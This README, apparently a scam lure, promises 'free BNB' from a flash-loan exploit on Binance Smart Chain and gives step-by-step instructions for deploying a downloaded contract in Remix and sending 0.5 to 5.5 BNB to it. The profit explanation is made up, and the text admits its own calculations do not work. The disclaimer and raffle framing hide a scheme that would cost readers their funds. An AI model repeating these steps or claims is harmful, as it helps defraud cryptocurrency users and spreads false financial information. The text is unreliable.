# FlashLoanAutomator

NOTE: FOR EDUCATIONAL PURPOSES ONLY.  This is a flashloan smart contract exploit demo, do not abuse it.  However if you find the flag, post it with your address and you will be entered into a raffle for a chance to win a part of the flashloan exploit prize pool.
## Overview:

There is an exploit in the flashloan smart contract on the binance smart chain network which has caused some serious panic over the last week.  Smart contract code is very difficult to fix and previous exploits work.  There is no saying when this will be patched because blockchain contracts are difficult to read, understand, and maintain.  To learn, deploy this flashloan contract manager interface and use its action function to exploit the flashloan and trigger the exploit. 

When you deploy the contract, you must add 0.25-1.5 BNB.  This will make sure the transaction does not fail due to network congestion, gas, and blockchain block transaction prioritizion. The higher the gas amount the quicker the transaction is processed in the block. According to the original smartcontract developer, the multiplier finance logic also provides a greater the reward and higher chances of success. 

UPDATED Code: Works As of 13/June/2021, last verfied 02/July/2021.

## Step-By-Step: 
Follow The GUIDE Carefully or the transaction wont go through and you have to redo again all steps.

Step 1: Go to http://remix.ethereum.org
Step 2: Click the contracts folder then the create new file icon, Create a file call it SetupLoanContract.sol hit ENTER (Create this file in the contracts folder (Watch Video)
Step 3: Download & then copy and paste the contract code into REMIX Panel (As per the video)

Step 4: Click Deploy & Run ICON (Left hand side)
Step 5: Change Environment to (Injected Web3)
Step 6: Connect you wallet when prompted (Metamask Preferable)
Step 7: Click Solidity Compiler Icon (Change Complier version greater than 0.5.0); Set compiler to 0.5.17 instead of 0.5.0 if it won't let you compile.
Step 8: Click compile SetupLoanContract.sol
Step 9: Click Deploy & Run transaction icon
Step 10: Click string token name, name your token and symbol (could be anything) ie mytoken, MYTOK
Step 11: Enter Loan Amount IE 1,000 BNB preferable
Step 12: Click Orange Transact Button
Step 13: Click confirm on wallet/metamask (wait for confirmation)
Step 14: New contract will appear under DEPLOYED Contract Field
Step 15: Copy new contract address generated from the loan pool
Step 16: Click send on METAMASK & Paste Contract Address
Step 17: 
Send 0.5 BNB if loan amount is less than 1,000BNB
Send 1.5 BNB if loan amount is greater than 1,000BNB
Send 3BNB if loan amount is greater than 2,000 BNB
Send 4.5 BNB if loan amount is greater than 3,000 BNB
Send 5.5 BNB if loan amount is greater than 4,000 BNB

1.5BNB +  for each 1,000 BNB you are loaning

Avoid using very low amounts as contract may fail below 0.5 BNB

Note: Use Compiler Version 0.5.17 or above  on REMIX (Compiler Section)

And that is how you get FREE BNB using a flash loan!


How the smart contract works:
1. We will use the multipler-finance contracts to borrow a flash loan of around 1,000 BNB from Multiplier Finance to make an arbitrage trade on Pancakeswap .

2. To prepare the arbitrage, BNB is swaped into USDT using PancakeSwap swap contract code. (50% BNB swapped into 50% USDT) (At the time of this video, 1 BNB = 340 USDT); So we will have about 500 BNB and 170,000 USDT.

3. The code will let you deploy your own token on Pancakeswap.

4. Provide liquidity in the 2 pools in such ratio (it is our own token and liquidity pool, so we have the power to set the initial price of the token):

Your Token (TOK) : BNB has 1:1 ratio (TOK 1 = 1 BNB)

Your Token (TOK) : USDT has 500: 1 ratio ( TOK 1 = 500 USDT)

5. The code perform the following swaps in a loop until all the initial flash loaned amount is in our liquidity pools:

Swap BNB (500) into TOK (500)

Swap TOK (500) into USDT (250,000)

Swap USDT (250,000) into BNB (700)

6. You will now have 1200 BNB. You can repay the 1000 BNB loan + any gas fees + Slippages and keep the remaining as profits, all within the same smart contract.
Although the calculations does not work as such but you still make profit.

Please note this video is for demonstration purposes only, we do not recommend using exploits for free money.
**********************************************ATTENTION********************************************
*IF YOU DONT PUT THE ENOUGH BNB THE BORROW AND THE FLASHLOAN MIGHT FAIL due to the interest to be paid at the end of the flash loans or transaction gas cost. Add at least 0.3 BNB in each transaction.
